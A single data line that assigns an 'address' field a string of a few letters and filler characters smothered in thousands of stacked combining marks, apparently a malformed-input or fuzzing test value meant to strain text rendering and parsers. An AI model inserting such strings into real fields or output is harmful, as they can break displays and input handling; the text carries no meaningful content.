      address: '̷̡̢̢̢̢̢̡̢̢̨̧̛͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑̕͘̚̚͘͜͜͜͠͠͠͠͝ͅ️̴̷̡̢̢̢̢̢̡̢̢̨̧̛̛̱̠͍̟̺͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑̕̕̕̚͘̕̕͘̚̚͘͜͜͜͝͠͠͝͝͝͠͠͠͠͝ͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͝͠͝͠͝͠͝